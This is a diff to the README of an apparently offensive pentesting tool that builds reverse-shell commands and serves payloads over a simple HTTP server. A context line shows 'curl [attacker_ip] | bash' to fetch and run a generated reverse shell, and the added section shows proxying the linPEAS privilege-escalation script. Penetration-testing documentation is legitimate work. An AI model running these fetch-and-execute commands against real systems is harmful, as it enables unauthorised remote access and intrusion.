@@ -28,6 +28,7 @@ _/ ___\/  _ \ /     \ /     \__  \  /    \  / __ |
 ```
 
 This is a VERY simple script that can be used to create your basic reverse-shell commands.
+Using a simplified http-server lets us serve files at server root, making calling them more convenient.
 
 Shells from: [PentestMonkey](https://github.com/pentestmonkey)
 
@@ -99,3 +100,11 @@ curl [attacker_ip] | bash
 ```
 
 should run the reverse shell generated, if bash is present and http is not blocked.
+
+### Proxy a preset script
+
+```
+C3>proxy linpeas
+Proxying url: https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
+```
+serves the linpeas shellscript-file at server root
